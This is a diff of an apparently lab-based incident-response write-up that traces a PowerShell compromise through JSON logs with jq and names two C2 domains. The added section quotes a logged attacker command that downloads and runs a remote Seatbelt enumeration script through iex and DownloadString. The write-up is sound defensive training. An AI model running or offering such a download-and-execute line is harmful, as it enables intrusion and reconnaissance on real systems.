@@ -78,7 +78,7 @@ The combination of an email-delivered .lnk file, hidden PowerShell execution, Ba
 
 ### Task 2: Endpoint Security
 
-We now can conclude that the PowerShell command observed in the first task signaled initial execution and compromise of this workstation. Further actions along the kill chain are most likely after initial access. 
+We now can conclude that the PowerShell command observed in the first task signaled initial execution and compromise of Julianne's workstation. Further actions along the kill chain are most likely after initial access. 
 Our supervisor has given us an helpful investigative guide to follow for task 2.
 - Using the previous findings, we can start our analysis by searching the execution of the initial payload in the PowerShell logs.
 - Since the given data is JSON, we can parse it in CLI using the jq command.
@@ -91,7 +91,15 @@ First thought process is to look for the suspicious domain found when we decoded
 **Findings**
 - The attacker reaches out to two likely Command and Control (C2) Servers: *cdn.bpakcaging.xyz && files.bpakcaging.xyz*.
 
-Next, Our supervisor instructs us to find the enumeration tool that the attacker downloads. 
+Next, Our supervisor instructs us to find the enumeration tool that the attacker downloads. My initial thought process is to narrow down the results by using the grepping for .downloadstring since we know our attacker uses this method for ingress tool transfer. Command: ```cat powershell.json | jq | grep -i "downloadstring"```
+
+**Findings**
+- We get an interesting result of ```"ScriptBlockText": "iex(new-object net.webclient).downloadstring('https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');pwd"```
+- Nothing stood out at first for me, but I researched the GitHub repository in the command above, and found out eventually that the enumeration tool was the tool known as *Seatbelt*.
+
+  <img width="886" height="355" alt="image" src="https://github.com/user-attachments/assets/0b68d4c3-7211-4afa-a589-f30b5f8db5a1" />
+
+
 
 
 
